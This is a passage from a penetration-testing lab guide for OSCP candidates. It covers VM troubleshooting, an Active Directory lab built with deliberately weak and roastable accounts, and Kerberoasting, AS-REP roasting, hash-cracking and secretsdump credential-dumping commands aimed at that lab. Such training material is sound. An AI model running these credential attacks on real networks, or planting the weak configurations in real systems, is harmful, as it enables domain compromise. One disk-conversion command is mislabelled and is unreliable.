   # Should show: 192.168.56.x
   
   # Vulnerable VM might use DHCP:
   ip addr
   # If no IP, run: sudo dhclient eth1

3. Test connectivity:
   ping 192.168.56.1  # Ping host
   
4. If still fails, restart networking:
   sudo systemctl restart networking
```

---

### Issue 4: "VM Extremely Slow"

**Problem**: VM takes forever to do anything

**Solutions**:
```
1. Allocate More RAM:
   VM Settings → System → Base Memory
   Increase to 4096 MB (4GB) for Kali

2. Enable 3D Acceleration:
   VM Settings → Display → Enable 3D Acceleration

3. Install Guest Additions:
   Devices menu → Insert Guest Additions CD
   sudo sh /media/cdrom/VBoxLinuxAdditions.run

4. Use SSD instead of HDD:
   Move VMs to SSD storage

5. Reduce number of running VMs:
   Close unused VMs

6. Disable unnecessary services:
   sudo systemctl disable bluetooth
   sudo systemctl disable cups  # Printer service
```

---

### Issue 5: "Not Enough Disk Space"

**Problem**: VM disk full, can't download tools

**Solution**:
```
Option 1: Expand Virtual Disk
VirtualBox → File → Virtual Media Manager
Select VM disk → Modify → Increase size to 100GB

Then resize partition from VM:
sudo gparted  # GUI tool
OR
sudo lvextend -l +100%FREE /dev/mapper/kali--vg-root
sudo resize2fs /dev/mapper/kali--vg-root

Option 2: Clean Up
sudo apt clean  # Remove package cache
rm -rf ~/.cache/*
rm -rf /tmp/*
```

---

## 📋 PART 10: LAB MAINTENANCE CHECKLIST

### Weekly Tasks
```
☐ Update Kali Linux
  sudo apt update && sudo apt upgrade -y

☐ Take snapshots before major changes
  VirtualBox: Machine → Take Snapshot

☐ Test network connectivity
  ping 8.8.8.8
  
☐ Backup important notes
  Export CherryTree database
```

### Monthly Tasks
```
☐ Review and organize notes
☐ Update vulnerable VMs (check VulnHub for new ones)
☐ Clean up old snapshots (they take disk space)
☐ Verify backups are working
☐ Update tools in Kali:
  sudo apt update && sudo apt full-upgrade
```

### Before OSCP Exam
```
☐ Test all VMs in your lab
☐ Verify VPN connectivity
☐ Ensure note-taking system is ready
☐ Take final snapshots of all VMs
☐ Have backup laptop/VM ready
```

---

## 🎯 QUICK START GUIDE (TL;DR)

### Day 1: Setup (4 hours)
```
1. Download VirtualBox (30 min)
2. Download Kali Linux OVA (30 min)
3. Import Kali to VirtualBox (10 min)
4. Update Kali (30 min)
5. Download Metasploitable 2 (30 min)
6. Import Metasploitable 2 (10 min)
7. Configure Host-Only network (30 min)
8. Test: Kali → scan → Metasploitable (30 min)

Result: Working lab with 1 attacker + 1 victim VM
```

### Week 1: Practice (10 hours)
```
1. Complete Metasploitable 2 (6 hours)
2. Setup DVWA (1 hour)
3. Practice DVWA on LOW difficulty (3 hours)

Result: Confidence in basic attacks
```

### Month 1: Expand (40 hours)
```
1. Download 5 VulnHub VMs (5 hours)
2. Complete each VM (25 hours)
3. Setup TryHackMe account (1 hour)
4. Complete "Complete Beginner" path (40 hours)

Result: Solid fundamentals, ready for intermediate content
```

### Month 2-3: OSCP Prep (100 hours)
```
1. Subscribe to HackTheBox VIP ($20/month)
2. Complete TJ Null's OSCP list (80 hours)
3. Subscribe to Proving Grounds ($20/month)
4. Complete 30+ PG machines (100 hours)

Result: Ready for OSCP exam
```

---

## 🏆 FINAL RECOMMENDATIONS

**For Absolute Beginners**:
```
Start: VirtualBox + Kali + Metasploitable 2 (Free)
After 1 month: Add TryHackMe ($10/month)
Total Cost: $10/month
```

**For OSCP Candidates**:
```
Must Have:
├─ VirtualBox + Kali (Free)
├─ HackTheBox VIP ($20/month for 3-6 months)
└─ Proving Grounds Practice ($20/month for 2-3 months)

Nice to Have:
├─ TryHackMe Premium ($10/month)
└─ 16GB+ RAM laptop

Total Cost: $40/month for 3-6 months = $120-$240
```

**For Professional Homelab**:
```
Hardware: Dedicated server ($500-$1000)
Software: Proxmox (Free)
Cloud: AWS Free Tier (12 months free)
Subscriptions: HTB + PG + THM ($50/month)

Total: $1000 one-time + $50/month ongoing
```

---

**Your lab is your foundation. Invest in it wisely, and it will pay dividends throughout your career! 🚀**

---

## 🏢 PART 11: ACTIVE DIRECTORY LAB SETUP (DETAILED)

### Why Active Directory?

**Critical for OSCP 2024+**:
- 40 points of OSCP exam (2 AD machines)
- 80% of enterprise networks use AD
- Common in job interviews: "Tell me about AD attacks"

**What You'll Practice**:
- Kerberoasting
- AS-REP Roasting
- Pass-the-Hash (PtH)
- Pass-the-Ticket (PtT)
- DCSync
- Golden/Silver Tickets
- BloodHound analysis

---

### Minimum AD Lab (16GB RAM Required)

**Architecture**:
```
┌────────────────────────────────────────────────────────┐
│           BASIC ACTIVE DIRECTORY LAB                   │
├────────────────────────────────────────────────────────┤
│                                                        │
│  ┌──────────────┐                                      │
│  │  Kali Linux  │  (Attacker)                          │
│  │  2GB RAM     │                                      │
│  └──────┬───────┘                                      │
│         │                                              │
│         │  Host-Only Network (192.168.100.0/24)       │
│         │                                              │
│         ├──────────┬──────────────────────┐            │
│         │          │                      │            │
│  ┌──────▼─────┐ ┌──▼───────────┐  ┌──────▼──────┐    │
│  │   DC01     │ │   WIN10-01   │  │  WIN10-02   │    │
│  │ Domain     │ │  Workstation │  │ Workstation │    │
│  │ Controller │ │  (User1)     │  │  (User2)    │    │
│  │ 4GB RAM    │ │  2GB RAM     │  │  2GB RAM    │    │
│  │ Server2019 │ │  Windows 10  │  │ Windows 10  │    │
│  └────────────┘ └──────────────┘  └─────────────┘    │
│                                                        │
│  Domain: VULNERABLE.LOCAL                              │
│  Total RAM: 10GB + Host OS (2GB) = 12GB minimum       │
└────────────────────────────────────────────────────────┘
```

---

### Step-by-Step AD Lab Build

**Part 1: Download Windows ISOs** (Free, Legal)

```
Windows Server 2019 Evaluation (180 days free):
https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019

Windows 10 Enterprise Evaluation (90 days free):
https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise

File sizes:
├─ Server 2019: ~5GB
└─ Windows 10: ~5GB

Pro Tip: Use Snapshots to preserve evaluation period!
```

---

**Part 2: Install Domain Controller (DC01)**

```
1. Create VM in VirtualBox:
   ├─ Name: DC01
   ├─ Type: Windows (64-bit)
   ├─ RAM: 4096 MB
   ├─ Disk: 60GB (dynamic)
   └─ Network: Host-Only Adapter

2. Install Windows Server 2019:
   ├─ Choose "Desktop Experience" (GUI)
   ├─ Administrator password: P@ssw0rd! (lab only!)
   └─ Complete installation (~30 minutes)

3. Configure Static IP:
   PowerShell (as Administrator):
   
   New-NetIPAddress -InterfaceAlias "Ethernet" `
     -IPAddress 192.168.100.10 `
     -PrefixLength 24 `
     -DefaultGateway 192.168.100.1
   
   Set-DnsClientServerAddress -InterfaceAlias "Ethernet" `
     -ServerAddresses 127.0.0.1

4. Rename Computer:
   Rename-Computer -NewName DC01 -Restart

5. Install Active Directory Domain Services:
   Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

6. Promote to Domain Controller:
   Install-ADDSForest `
     -DomainName "vulnerable.local" `
     -DomainNetbiosName "VULNERABLE" `
     -InstallDns `
     -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) `
     -Force

   Wait for automatic reboot (~10 minutes)

7. Verify Domain Controller:
   Get-ADDomainController
   Get-ADDomain
```

---

**Part 3: Create Domain Users (Vulnerable Accounts)**

```powershell
# ═══════════════════════════════════════════════════════════
# CREATE ORGANIZATIONAL UNITS
# ═══════════════════════════════════════════════════════════
New-ADOrganizationalUnit -Name "IT" -Path "DC=vulnerable,DC=local"
New-ADOrganizationalUnit -Name "HR" -Path "DC=vulnerable,DC=local"
New-ADOrganizationalUnit -Name "Finance" -Path "DC=vulnerable,DC=local"

# ═══════════════════════════════════════════════════════════
# CREATE VULNERABLE USERS
# ═══════════════════════════════════════════════════════════

# User with weak password (Kerberoastable)
New-ADUser -Name "SQLService" `
  -UserPrincipalName "sqlservice@vulnerable.local" `
  -AccountPassword (ConvertTo-SecureString "MyPassword123!" -AsPlainText -Force) `
  -Enabled $true `
  -PasswordNeverExpires $true `
  -Path "OU=IT,DC=vulnerable,DC=local"

Set-ADUser -Identity SQLService -ServicePrincipalNames @{Add='MSSQLSvc/DC01.vulnerable.local:1433'}

# User without Kerberos pre-authentication (AS-REP Roastable)
New-ADUser -Name "NoPreAuth" `
  -UserPrincipalName "nopreauth@vulnerable.local" `
  -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
  -Enabled $true `
  -Path "OU=HR,DC=vulnerable,DC=local"

Set-ADAccountControl -Identity NoPreAuth -DoesNotRequirePreAuth $true

# Standard users
New-ADUser -Name "John Smith" `
  -SamAccountName "jsmith" `
  -UserPrincipalName "jsmith@vulnerable.local" `
  -AccountPassword (ConvertTo-SecureString "Welcome2024!" -AsPlainText -Force) `
  -Enabled $true `
  -Path "OU=Finance,DC=vulnerable,DC=local"

New-ADUser -Name "Jane Doe" `
  -SamAccountName "jdoe" `
  -UserPrincipalName "jdoe@vulnerable.local" `
  -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
  -Enabled $true `
  -Path "OU=HR,DC=vulnerable,DC=local"

# Admin user with weak password
New-ADUser -Name "Admin Backup" `
  -SamAccountName "adminbackup" `
  -UserPrincipalName "adminbackup@vulnerable.local" `
  -AccountPassword (ConvertTo-SecureString "backup123" -AsPlainText -Force) `
  -Enabled $true `
  -Path "OU=IT,DC=vulnerable,DC=local"

Add-ADGroupMember -Identity "Domain Admins" -Members adminbackup

# ═══════════════════════════════════════════════════════════
# CREATE SECURITY GROUPS
# ═══════════════════════════════════════════════════════════
New-ADGroup -Name "IT Support" -GroupScope Global -Path "OU=IT,DC=vulnerable,DC=local"
New-ADGroup -Name "HR Team" -GroupScope Global -Path "OU=HR,DC=vulnerable,DC=local"
New-ADGroup -Name "Finance Team" -GroupScope Global -Path "OU=Finance,DC=vulnerable,DC=local"

# Add users to groups
Add-ADGroupMember -Identity "IT Support" -Members SQLService
Add-ADGroupMember -Identity "HR Team" -Members jdoe,NoPreAuth
Add-ADGroupMember -Identity "Finance Team" -Members jsmith
```

---

**Part 4: Setup Workstation VMs**

```
1. Create WIN10-01 VM:
   ├─ Name: WIN10-01
   ├─ RAM: 2048 MB
   ├─ Disk: 40GB
   └─ Network: Host-Only Adapter

2. Install Windows 10 Enterprise
   ├─ Skip product key
   ├─ Create local user: localuser / P@ssw0rd!
   └─ Complete installation

3. Join Domain:
   # Set DNS to DC
   Set-DnsClientServerAddress -InterfaceAlias "Ethernet" `
     -ServerAddresses 192.168.100.10
   
   # Join domain
   Add-Computer -DomainName "vulnerable.local" `
     -Credential (Get-Credential) `
     -Restart
   
   # Enter: VULNERABLE\Administrator / P@ssw0rd!

4. Login as domain user:
   VULNERABLE\jsmith / Welcome2024!

5. Repeat for WIN10-02 with user: VULNERABLE\jdoe
```

---

**Part 5: Attack the Lab from Kali**

```bash
# ═══════════════════════════════════════════════════════════
# ENUMERATION
# ═══════════════════════════════════════════════════════════

# DNS enumeration
nmap -p 53 192.168.100.10

# SMB enumeration
crackmapexec smb 192.168.100.0/24

# LDAP enumeration
ldapsearch -x -H ldap://192.168.100.10 -b "DC=vulnerable,DC=local"

# ═══════════════════════════════════════════════════════════
# KERBEROASTING
# ═══════════════════════════════════════════════════════════

# Get domain user first (or use null session if available)
# Assume we compromised jsmith:jsmith@Welcome2024!

# Using impacket
GetUserSPNs.py vulnerable.local/jsmith:Welcome2024! -dc-ip 192.168.100.10 -request

# Crack the hash
hashcat -m 13100 sqlservice.hash /usr/share/wordlists/rockyou.txt

# ═══════════════════════════════════════════════════════════
# AS-REP ROASTING
# ═══════════════════════════════════════════════════════════

# Get users without pre-auth
GetNPUsers.py vulnerable.local/ -dc-ip 192.168.100.10 -usersfile users.txt -format hashcat

# Crack hash
hashcat -m 18200 nopreauth.hash /usr/share/wordlists/rockyou.txt

# ═══════════════════════════════════════════════════════════
# BLOODHOUND ANALYSIS
# ═══════════════════════════════════════════════════════════

# Collect data
bloodhound-python -d vulnerable.local -u jsmith -p Welcome2024! -ns 192.168.100.10 -c All

# Start Neo4j database
sudo neo4j start

# Start BloodHound GUI
bloodhound

# Import JSON files, analyze attack paths

# ═══════════════════════════════════════════════════════════
# DCSYNC (if you have Domain Admin)
# ═══════════════════════════════════════════════════════════

secretsdump.py vulnerable.local/adminbackup:backup123@192.168.100.10

# Dump all password hashes!
```

---

## 🐳 PART 12: DOCKER-BASED LABS (LIGHTWEIGHT ALTERNATIVE)

### Why Docker?

**Advantages**:
- Lightweight (MB vs GB for VMs)
- Fast startup (seconds vs minutes)
- Easy to share (Dockerfile = reproducible environment)
- Less RAM usage (10 containers = 2GB vs 10 VMs = 20GB)

**Disadvantages**:
- Linux containers only (can't run Windows)
- Shared kernel (not as isolated as VMs)
- Not suitable for kernel exploits

---

### Docker Lab Setup

```bash
# ═══════════════════════════════════════════════════════════
# INSTALL DOCKER ON KALI
# ═══════════════════════════════════════════════════════════
sudo apt update
sudo apt install -y docker.io docker-compose
sudo systemctl start docker
sudo systemctl enable docker

# Add user to docker group (avoid sudo)
sudo usermod -aG docker $USER
# Logout and login for changes to take effect

# ═══════════════════════════════════════════════════════════
# RUN VULNERABLE WEB APPS
# ═══════════════════════════════════════════════════════════

# DVWA
docker run -d -p 80:80 vulnerables/web-dvwa

# bWAPP
docker run -d -p 8080:80 raesene/bwapp

# OWASP Juice Shop (Modern vulnerable app)
docker run -d -p 3000:3000 bkimminich/juice-shop

# Access:
# DVWA: http://localhost
# bWAPP: http://localhost:8080
# Juice Shop: http://localhost:3000

# ═══════════════════════════════════════════════════════════
# RUN VULNERABLE SERVICES
# ═══════════════════════════════════════════════════════════

# Vulnerable FTP server
docker run -d -p 21:21 -p 30000-30009:30000-30009 \
  --name vulnerable-ftp \
  -e FTP_USER=admin \
  -e FTP_PASS=admin123 \
  stilliard/pure-ftpd

# Vulnerable SSH (intentionally weak config)
docker run -d -p 2222:22 \
  --name vulnerable-ssh \
  -e SSH_USER=root \
  -e SSH_PASSWORD=toor \
  panubo/sshd

# ═══════════════════════════════════════════════════════════
# DOCKER COMPOSE MULTI-CONTAINER LAB
# ═══════════════════════════════════════════════════════════

# Create docker-compose.yml:
cat > docker-compose.yml << 'EOF'
version: '3'
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "80:80"
  
  bwapp:
    image: raesene/bwapp
    ports:
      - "8080:80"
  
  juiceshop:
    image: bkimminich/juice-shop
    ports:
      - "3000:3000"
  
  webgoat:
    image: webgoat/webgoat-8.0
    ports:
      - "8081:8080"
EOF

# Start all containers
docker-compose up -d

# Stop all
docker-compose down

# ═══════════════════════════════════════════════════════════
# DOCKER MANAGEMENT COMMANDS
# ═══════════════════════════════════════════════════════════

# List running containers
docker ps

# Stop container
docker stop <container-id>

# Remove container
docker rm <container-id>

# View logs
docker logs <container-id>

# Execute command in container
docker exec -it <container-id> /bin/bash
```

---

## 🔒 PART 13: LAB SECURITY BEST PRACTICES

### Isolate Your Lab!

**Why Isolation Matters**:
- Prevent vulnerable VMs from attacking your home network
- Stop malware from spreading
- Comply with ISP terms (no port scanning on public internet)
- Legal protection (all attacks stay in your lab)

---

### Network Isolation Checklist

```
✅ Use Host-Only or Internal networks for vulnerable VMs
✅ Never use Bridged mode for vulnerable machines
✅ Firewall rules between lab and home network
✅ Separate VLAN if using physical lab server
✅ No internet access for vulnerable VMs
✅ Disable IPv6 if not needed (reduces attack surface)

❌ DON'T bridge vulnerable VMs to home network
❌ DON'T scan external IPs from your lab
❌ DON'T forward ports from router to lab VMs
❌ DON'T disable Windows Defender on host OS
```

---

### PfSense Firewall VM (Advanced)

**Setup a virtual firewall between Kali and targets**:

```
Download: https://www.pfsense.org/download/

Architecture:
┌─────────────────────────────────────────────────┐
│  Kali (192.168.1.100)                           │
│        │                                        │
│        ▼                                        │
│  ┌──────────────┐                               │
│  │   PfSense    │                               │
│  │  Firewall VM │                               │
│  │ WAN: DHCP    │                               │
│  │ LAN: 10.0.0.1│                               │
│  └──────┬───────┘                               │
│         │                                       │
│         ├──────┬──────────┬──────────┐          │
│         │      │          │          │          │
│    ┌────▼──┐ ┌─▼──────┐ ┌▼────────┐ ┌▼───────┐ │
│    │ DVWA  │ │Metaspl │ │ AD DC01 │ │WIN10-01│ │
│    │10.0.0.│ │10.0.0. │ │10.0.0.  │ │10.0.0. │ │
│    │  10   │ │  20    │ │  30     │ │  40    │ │
│    └───────┘ └────────┘ └─────────┘ └────────┘ │
└─────────────────────────────────────────────────┘

Benefits:
├─ All traffic logged
├─ Can create firewall rules
├─ Simulate enterprise environment
└─ Learn network segmentation
```

---

## 📊 PART 14: LAB PERFORMANCE OPTIMIZATION

### Speed Up Your VMs

**1. Storage Optimization**:
```
Problem: VMs on mechanical HDD = Very slow

Solutions:
✅ Use SSD for VM storage
✅ Use VirtualBox "Fixed size" disk (faster than dynamic)
✅ Enable "VDI" format (better than VMDK for VirtualBox)

Example:
# Convert dynamic to fixed disk (caution: takes time!)
VBoxManage modifymedium disk "kali.vdi" --resize 100000 --compact
```

**2. CPU Optimization**:
```
VM Settings → System → Processor:
├─ CPUs: Half of host cores (4-core host = 2 CPU for VM)
├─ Execution Cap: 100%
└─ Enable PAE/NX: Yes

Don't:
❌ Allocate all cores to VM (host OS needs some!)
❌ Enable VT-x nested virtualization (unless needed)
```

**3. RAM Tuning**:
```
Golden Rules:
├─ Never allocate all RAM to VMs
├─ Leave 25% for host OS
├─ Don't overcommit (e.g., 3 VMs with 8GB each on 16GB host)

Example:
16GB Total:
├─ Host OS: 4GB
├─ Kali: 6GB
├─ Target VM: 4GB
└─ Spare: 2GB
```

**4. Network Performance**:
```
VM Settings → Network → Advanced:
├─ Adapter Type: Paravirtualized Network (virtio-net)
└─ Promiscuous Mode: Deny (unless packet sniffing)
```

**5. Disable Unnecessary Services**:
```bash
# In Kali VM, disable unneeded services:
sudo systemctl disable bluetooth
sudo systemctl disable cups  # Printing
sudo systemctl disable avahi-daemon  # Network discovery

# In Windows VMs:
# Services → Disable:
# ├─ Windows Search
# ├─ Superfetch
# └─ Print Spooler (if not needed)
```

---

## 🎮 PART 15: LAB AUTOMATION SCRIPTS

### Automated Kali Setup Script

```bash
#!/bin/bash
# save as: kali-lab-setup.sh
# Usage: ./kali-lab-setup.sh

echo "[*] Starting Kali Lab Setup..."

# Update system
echo "[*] Updating system packages..."
sudo apt update && sudo apt upgrade -y

# Install essential tools
echo "[*] Installing essential tools..."
sudo apt install -y \
    tmux \
    vim \
    git \
    curl \
    wget \
    netcat-traditional \
    nmap \
    gobuster \
    nikto \
    enum4linux \
    smbclient \
    john \
    hashcat \
    hydra \
    sqlmap \
    burpsuite \
    wireshark \
    bloodhound \
    python3-pip \
    python3-venv \
    docker.io \
    docker-compose \
    seclists \
    wordlists

# Install Python security tools
echo "[*] Installing Python tools..."
pip3 install \
    impacket \
    bloodhound \
    crackmapexec \
    pwntools \
    pycryptodome

# Create directory structure
echo "[*] Creating directory structure..."
mkdir -p ~/oscp/{scans,exploits,notes,screenshots,tools,wordlists}

# Download useful tools
echo "[*] Downloading additional tools..."
cd ~/oscp/tools

# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# WinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# pspy
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64

# PowerUp
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

chmod +x *.sh pspy64

# Setup aliases
echo "[*] Configuring aliases..."
cat >> ~/.bashrc << 'EOF'

# OSCP Aliases
alias ll='ls -lah'
alias nse='ls /usr/share/nmap/scripts/ | grep'
alias http='python3 -m http.server 80'
alias smb='impacket-smbserver share . -smb2support'
alias myip='ip -4 addr show tun0 | grep -oP "(?<=inet\s)\d+(\.\d+){3}"'
alias scan='nmap -sV -sC -oN'
alias fullscan='nmap -sV -sC -p- -oN'

# Quick commands
alias nosql='sudo systemctl start neo4j'
alias metasploit='msfconsole -q'
EOF

# Tmux configuration
echo "[*] Configuring tmux..."
cat > ~/.tmux.conf << 'EOF'
set -g mouse on
set -g history-limit 10000
set -g base-index 1
setw -g pane-base-index 1
EOF

# Configure Neo4j for BloodHound
echo "[*] Setting up Neo4j for BloodHound..."
sudo systemctl enable neo4j
sudo neo4j-admin set-initial-password bloodhound

echo "[+] Setup complete!"
echo "[*] Please reboot your Kali VM"
echo "[*] After reboot, run: source ~/.bashrc"
```

---

### Quick Lab Snapshot Script

```bash
#!/bin/bash
# save as: snapshot-all.sh
# Creates snapshots of all VMs

echo "[*] Creating snapshots for all VMs..."

VMS=("Kali-Linux" "Metasploitable2" "DVWA" "DC01" "WIN10-01")

for vm in "${VMS[@]}"
do
    echo "[*] Snapshotting: $vm"
    VBoxManage snapshot "$vm" take "Auto-$(date +%Y%m%d-%H%M%S)" \
        --description "Automated snapshot"
done

echo "[+] All snapshots created!"
```

---

## 📖 PART 16: RECOMMENDED LEARNING PATH

### 30-Day Lab Mastery Plan

**Week 1: Fundamentals**
```
Day 1: Setup VirtualBox + Kali (4 hours)
Day 2: Install Metasploitable 2 (2 hours)
Day 3: Complete basic nmap scanning exercises (3 hours)
Day 4: Exploit 5 services on Metasploitable (4 hours)
Day 5: Setup DVWA, complete Low difficulty (3 hours)
Day 6: VulnHub machine: Mr. Robot (6 hours)
Day 7: Review week, organize notes (2 hours)

Skills Gained:
✅ VM management
✅ Basic enumeration
✅ Web app exploitation
✅ Linux privilege escalation
```

**Week 2: Intermediate**
```
Day 8-10: TryHackMe "Complete Beginner" path (12 hours)
Day 11-12: HackTheBox: Lame, Beep (8 hours)
Day 13-14: Setup Windows 10 lab, exploit (6 hours)

Skills Gained:
✅ Structured methodology
✅ Windows exploitation
✅ Report writing
```

**Week 3: Advanced**
```
Day 15-17: Setup Active Directory lab (8 hours)
Day 18-20: Practice Kerberoasting, AS-REP (6 hours)
Day 21: BloodHound analysis (4 hours)

Skills Gained:
✅ Active Directory attacks
✅ BloodHound
✅ Enterprise pentesting
```

**Week 4: Specialization**
```
Day 22-24: Focus on weak area (web apps OR privilege escalation) (12 hours)
Day 25-27: Complete 3 HTB Medium machines (18 hours)
Day 28-30: Mock OSCP exam (24 hours practice)

Skills Gained:
✅ Exam readiness
✅ Time management
✅ Report writing under pressure
```

---

## 🏆 FINAL CHECKLIST: IS YOUR LAB READY?

### Pre-OSCP Lab Readiness

```
Infrastructure:
☐ Kali Linux fully updated
☐ At least 3 vulnerable VMs setup
☐ Host-Only network configured
☐ Snapshots created for all VMs
☐ Backup of Kali VM on external drive

Tools:
☐ LinPEAS, WinPEAS downloaded
☐ Static binaries ready (nc.exe, pspy, etc.)
☐ Impacket suite installed
☐ BloodHound + Neo4j configured
☐ Python 3 + pip packages installed

Skills:
☐ Can exploit 5 services on Metasploitable 2
☐ Can root 3 Easy VulnHub machines
☐ Can compromise HTB Easy machine in <4 hours
☐ Comfortable with Active Directory basics
☐ Can write a professional pentest report

Organization:
☐ Note-taking system setup (CherryTree/Obsidian)
☐ Directory structure created
☐ Cheat sheets prepared
☐ Troubleshooting guide bookmarked
☐ Backup plan if lab breaks during exam

If you checked all boxes: You're ready for OSCP labs!
```

---

## 💡 BONUS: LAB SHORTCUTS & PRO TIPS

### Time-Saving Aliases

```bash
# Add to ~/.bashrc

# Quick HTTP server with upload capability
alias httpup='python3 -m uploadserver 80'

# Quick SMB server
alias smb='impacket-smbserver share . -smb2support'

# Get your VPN IP (HTB/OSCP)
alias myip='ip -4 addr show tun0 | grep -oP "(?<=inet\s)\d+(\.\d+){3}"'

# Quick full port scan
alias fullscan='f(){ sudo nmap -sV -sC -p- -oA scans/$1 $1 };f'

# Quick gobuster
alias gobust='f(){ gobuster dir -u http://$1 -w /usr/share/seclists/Discovery/Web-Content/common.txt };f'

# Quick nikto
alias niktest='f(){ nikto -h $1 | tee scans/nikto-$1.txt };f'

# Start services
alias startpost='sudo systemctl start postgresql'
alias startmeta='sudo msfdb init && msfconsole'
alias startnoe='sudo neo4j start'
```

### Tmux Pentest Layout

```bash
# Create 4-pane layout automatically
alias tmuxlab='tmux new-session -d -s lab \; \
  split-window -v \; \
  split-window -h \; \
  select-pane -t 0 \; \
  split-window -h \; \
  select-pane -t 0 \; \
  attach-session -t lab'

# Usage: tmuxlab
# Result:
# ┌──────────┬──────────┐
# │  nmap    │  enum    │
# ├──────────┴──────────┤
# │      exploit        │
# ├─────────────────────┤
# │      notes          │
# └─────────────────────┘
```

---

**Your lab is your foundation. Invest in it wisely, and it will pay dividends throughout your career! 🚀**

---

**Document Version**: 2.0
**Last Updated**: January 2024
**Target Audience**: Fresh security graduates and OSCP candidates
**Estimated Setup Time**: 8-20 hours (basic), 40+ hours (advanced AD lab)
**Total Content**: Comprehensive lab setup from beginner to advanced

# End of Document
